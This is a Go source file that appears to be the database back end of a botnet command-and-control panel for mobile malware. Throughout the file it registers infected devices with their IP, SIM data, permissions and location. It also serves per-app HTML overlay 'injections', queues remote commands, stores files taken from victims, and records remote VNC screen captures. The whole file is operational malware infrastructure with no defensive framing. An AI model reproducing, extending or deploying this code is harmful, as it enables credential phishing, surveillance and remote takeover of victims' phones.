package db

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"time"
)

// CheckIDBot is ...
func IsBotExist(db *sql.DB, ID string) bool {
	rows, err := db.Query(`SELECT id FROM bots WHERE id=?`, ID)
	if err != nil {
		fmt.Print(err)
	}
	defer rows.Close()

	for rows.Next() {
		return true
	}
	return false
}

// InsertLog is ...
func InsertLog(db *sql.DB, ID string, application string, types string, logs string) {
	if IsBotExist(db, ID) {
		_, err1 := db.Exec(`SET NAMES utf8`)
		if err1 != nil {
			fmt.Print(err1)
		}

		t := time.Now()
		date := t.Format("2006-01-02 15:04:05")

		stmt, err := db.Prepare(`insert into bot_logs (bot_id, application, type, log, created_at, updated_at)
		value (?, ?, ?, ?, ?, ?)`)
		if err != nil {
			fmt.Print(err)
		}

		_, err = stmt.Exec(ID, application, types, logs, date, date)
		if err != nil {
			fmt.Print(err)
			fmt.Print("Log not imported:  ", logs)
		}
		defer stmt.Close()
	}
}

// UpdateInjection is ...
func UpdateInjection(db *sql.DB, ID string, apps []string) string {
	allInjections := ""
	activeInjection := ""

	if IsBotExist(db, ID) {
		for _, app := range apps {
			if app != "" {
				rows11, err := db.Query(`SELECT * FROM bot_injections WHERE bot_id=? AND application=?`, ID, app)
				if err != nil {
					fmt.Print(err)
				}
				defer rows11.Close()

				count := 0
				for rows11.Next() {
					count++
				}

				if count == 0 {
					stmt, err := db.Prepare(`insert into bot_injections (bot_id, application, is_active)
					value (?, ?, ?)`)
					if err != nil {
						fmt.Print(err)
					}

					_, err = stmt.Exec(ID, app, 0)
					if err != nil {
						fmt.Print(err)
					}
					defer stmt.Close()
				}

				rows1 := db.QueryRow(`SELECT application FROM injections WHERE application=?`, app)
				var app1 string
				err = rows1.Scan(&app1)
				if err == sql.ErrNoRows || err != nil {
					continue
				}

				allInjections = allInjections + ";" + app1
			}
		}

		rows1, err := db.Query(`SELECT application FROM bot_injections WHERE bot_id=? AND is_active=1`, ID)
		if err != nil {
			fmt.Print(err)
		}
		defer rows1.Close()

		rc1 := ScanColumnNames(rows1)
		for rows1.Next() {
			values := GetValuesRow(rows1, rc1)

			app1 := values["application"]
			activeInjection = activeInjection + ";" + app1
		}
	}

	if allInjections == "" {
		allInjections = "~no~"
	}
	if activeInjection == "" {
		activeInjection = "~no~"
	}
	response := fmt.Sprintf(`{"allInjections":"%s","activeInjection":"%s"}`, allInjections, activeInjection)
	return response
}

// DownloadInjections is ...
func DownloadInjections(db *sql.DB, ID string, injects []string) string {
	allInjections := "~no~"
	if IsBotExist(db, ID) {
		for _, inject := range injects {
			if inject != "" {
				rows1, err1 := db.Query(`SELECT * FROM injections WHERE application=?`, inject)
				if err1 != nil {
					fmt.Print(err1)
				}
				defer rows1.Close()

				rc1 := ScanColumnNames(rows1)
				for rows1.Next() {
					values1 := GetValuesRow(rows1, rc1)

					id := values1["id"]
					types := values1["type"]
					auto := values1["auto"]

					if id != "" {
						idInt, err := strconv.Atoi(id)
						if err != nil {
							panic(err)
						}

						rows2, err2 := db.Query(`SELECT * FROM injection_files WHERE injection_id=?`, idInt)
						if err2 != nil {
							fmt.Print(err2)
						}
						defer rows2.Close()

						rc := ScanColumnNames(rows2)
						for rows2.Next() {
							values := GetValuesRow(rows2, rc)

							html_blob := values["html_blob"]
							image_blob := values["image_blob"]

							html_blob_64 := base64.StdEncoding.EncodeToString([]byte(html_blob))
							image_blob_64 := base64.StdEncoding.EncodeToString([]byte(image_blob))

							response := fmt.Sprintf(`{"inject":"%s","html":"%s","icon":"%s","type":"%s","auto":"%s"}`, inject, html_blob_64, image_blob_64, types, auto)

							allInjections = allInjections + ";;;" + response
						}
					}
				}
			}
		}
	}

	response := fmt.Sprintf(`{"Injections":"%s"}`, allInjections)
	return response
}

// RegisterBot is ...
func RegisterBot(db *sql.DB, uid string, ip string, date string, country string, countryCode string, tag string, step string, sim_data string, metadata string, permission string, sub_info string, location string, settings string) {
	stmt, err := db.Prepare(`insert into bots (id, ip, last_connection, country, country_code, tag, update_settings, working_time, sim_data, metadata, permissions, sub_info, location, settings, created_at, updated_at, comment)
	value (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`)
	if err != nil {
		fmt.Print(err)
	}
	location1 := "{lat:0, lon:0}"
	if len(location) == 0 || location == "null" {
		location1 = location
	}

	_, err = stmt.Exec(uid, ip, date, country, countryCode, tag, 1, step, sim_data, metadata, permission, sub_info, location1, settings, date, date, "")
	if err != nil {
		fmt.Print(err)
	}
	defer stmt.Close()
}

// UpdateBot is ...
func UpdateBot(db *sql.DB, uid string, ip string, date string, step string, sub_info string, permission string, location string, sim_data string) {
	if len(location) == 0 || location == "null" {
		sqlStatement := `UPDATE bots SET ip = ?, last_connection = ?, working_time = ?, sub_info = ?, permissions = ?, sim_data = ?, updated_at = ? WHERE id = ?;`
		_, err := db.Exec(sqlStatement, ip, date, step, sub_info, permission, sim_data, date, uid)
		if err != nil {
			panic(err)
		}
	} else {
		sqlStatement := `UPDATE bots SET ip = ?, last_connection = ?, working_time = ?, sub_info = ?, permissions = ?, location = ?, sim_data = ?, updated_at = ? WHERE id = ?;`
		_, err := db.Exec(sqlStatement, ip, date, step, sub_info, permission, location, sim_data, date, uid)
		if err != nil {
			panic(err)
		}
	}
}

// UpdateSubInfoBot is ...
func UpdateSubInfoBot(db *sql.DB, uid string, date string, sub_info string) {
	sqlStatement := `UPDATE bots SET last_connection = ?, sub_info = ?, updated_at = ? WHERE id = ?;`
	_, err := db.Exec(sqlStatement, date, sub_info, date, uid)
	if err != nil {
		panic(err)
	}
}

// UpdateDateLastConnectionBot is ...
func UpdateDateLastConnectionBot(db *sql.DB, uid string) {
	t := time.Now()
	date := t.Format("2006-01-02 15:04:05")
	sqlStatement := `UPDATE bots SET last_connection = ?, updated_at = ? WHERE id = ?;`
	_, err := db.Exec(sqlStatement, date, date, uid)
	if err != nil {
		panic(err)
	}
}

// UpdateDateLastConnectionBotAndSettings is ...
func UpdateDateLastConnectionBotAndSettings(db *sql.DB, uid string) {
	t := time.Now()
	date := t.Format("2006-01-02 15:04:05")
	sqlStatement := `UPDATE bots SET last_connection = ?, updated_at = ?, update_settings = ? WHERE id = ?;`
	_, err := db.Exec(sqlStatement, date, date, 1, uid)
	if err != nil {
		panic(err)
	}
}

// UpdateLocationBot is ...
func UpdateLocationBot(db *sql.DB, uid string, date string, location string) {
	sqlStatement := `UPDATE bots SET last_connection = ?, location = ?, updated_at = ? WHERE id = ?;`
	_, err := db.Exec(sqlStatement, date, location, date, uid)
	if err != nil {
		panic(err)
	}
}

// GetGlobalSettings is ...
func GetGlobalSettings(db *sql.DB, uid string) string {
	rows, err := db.Query(`SELECT * FROM bots WHERE id=?`, uid)
	if err != nil {
		fmt.Print(err)
	}
	defer rows.Close()

	rc := ScanColumnNames(rows)
	for rows.Next() {
		values := GetValuesRow(rows, rc)

		update_settings := values["update_settings"]

		if strings.Compare(update_settings, "1") == 0 {
			settings := values["settings"]

			rows1, err := db.Query(`SELECT application FROM bot_injections WHERE bot_id=? AND is_active=1`, uid)
			if err != nil {
				fmt.Print(err)
			}
			defer rows1.Close()

			activeInjection := ""
			rc1 := ScanColumnNames(rows1)
			for rows1.Next() {
				values := GetValuesRow(rows1, rc1)

				app1 := values["application"]
				activeInjection = activeInjection + ";" + app1
			}

			_, err1 := db.Exec("UPDATE bots SET update_settings=0 WHERE id = ?", uid)
			if err1 != nil {
				fmt.Print(err1)
			}

			response := fmt.Sprintf(`"settings":%s,"activeInjection":"%s"`, settings, activeInjection)
			return response
		}
	}

	return "0"
}

type JSONData struct {
	Commands []string
}

// GetCommandBot is ...
func GetCommandBot(db *sql.DB, uid string) string {
	rows, err := db.Query(`SELECT command, id FROM bot_commands WHERE bot_id=? AND is_processed=0`, uid)
	if err != nil {
		fmt.Print(err)
	}
	defer rows.Close()

	var myjson JSONData

	//--- Get Commands ---//
	rc := ScanColumnNames(rows)
	exist := false
	for rows.Next() {
		exist = true
		values := GetValuesRow(rows, rc)
		command := values["command"]
		idcommand := values["id"]

		t := time.Now()
		date := t.Format("2006-01-02 15:04:05")

		_, err := db.Exec("UPDATE bot_commands SET is_processed=1, updated_at=? WHERE bot_id=? AND id=?", date, uid, idcommand)
		if err != nil {
			fmt.Print(err)
		}

		response := fmt.Sprintf(`{"id":%s, "commands":%s}`, idcommand, command)

		myjson.Commands = append(myjson.Commands, response)
	}

	b, err := json.Marshal(myjson)
	if err != nil {
		fmt.Println(err)
		return "0"
	}
	str := string(b)

	if exist == false {
		return "0"
	}

	if b != nil {
		if len(str) > 0 {
			return str
		}
	}

	return "0"
}

// PathInfo is ...
func PathInfo(db *sql.DB, uid string, date string, info string) {
	stmt, err := db.Prepare(`insert into bot_filemanager (bot_id, info, created_at)
	value (?, ?, ?)`)
	if err != nil {
		fmt.Print(err)
	}

	_, err = stmt.Exec(uid, info, date)
	if err != nil {
		fmt.Print(err)
	}
	defer stmt.Close()
}

// PutFile is ...
func PutFile(db *sql.DB, uid string, date string, path string, file string) {
	stmt, err := db.Prepare(`insert into bot_files (bot_id, path, content, created_at)
	value (?, ?, ?, ?)`)
	if err != nil {
		fmt.Print(err)
	}

	_, err = stmt.Exec(uid, path, file, date)
	if err != nil {
		fmt.Print(err)
	}
	defer stmt.Close()
}

// PutFile is ...
func RunCmd(db *sql.DB, uid string, date string, cmdId string) {
	_, err := db.Exec("UPDATE bot_commands SET run_at=?, updated_at=? WHERE bot_id=? AND id=?", date, date, uid, cmdId)
	if err != nil {
		fmt.Print(err)
	}
}

// Vnc_image is ...
func Vnc_image(db *sql.DB, uid string, date string, vnc_image string) {
	if IsBotVNCExist(db, uid) {
		_, err := db.Exec("UPDATE bot_vnc SET updated_at=?, image_blob=? WHERE bot_id=? ", date, vnc_image, uid)
		if err != nil {
			fmt.Print(err)
		}
	} else {
		stmt, err := db.Prepare(`insert into bot_vnc (bot_id, tree, created_at, updated_at, image_blob)
		value (?, ?, ?, ?, ?)`)
		if err != nil {
			fmt.Print(err)
		}

		_, err = stmt.Exec(uid, nil, date, date, vnc_image)
		if err != nil {
			fmt.Print(err)
		}
		defer stmt.Close()
	}
}

// Vnc_tree is ...
func Vnc_tree(db *sql.DB, uid string, date string, tree string) {
	if IsBotVNCExist(db, uid) {
		_, err := db.Exec("UPDATE bot_vnc SET updated_at=?, tree=? WHERE bot_id=? ", date, tree, uid)
		if err != nil {
			fmt.Print(err)
		}
	} else {
		stmt, err := db.Prepare(`insert into bot_vnc (bot_id, tree, created_at, updated_at, image_blob)
		value (?, ?, ?, ?, ?)`)
		if err != nil {
			fmt.Print(err)
		}

		_, err = stmt.Exec(uid, tree, date, date, nil)
		if err != nil {
			fmt.Print(err)
		}
		defer stmt.Close()
	}
}

// CheckIDBot is ...
func IsBotVNCExist(db *sql.DB, ID string) bool {
	rows, err := db.Query(`SELECT bot_id FROM bot_vnc WHERE bot_id=?`, ID)
	if err != nil {
		fmt.Print(err)
	}
	defer rows.Close()

	for rows.Next() {
		return true
	}
	return false
}
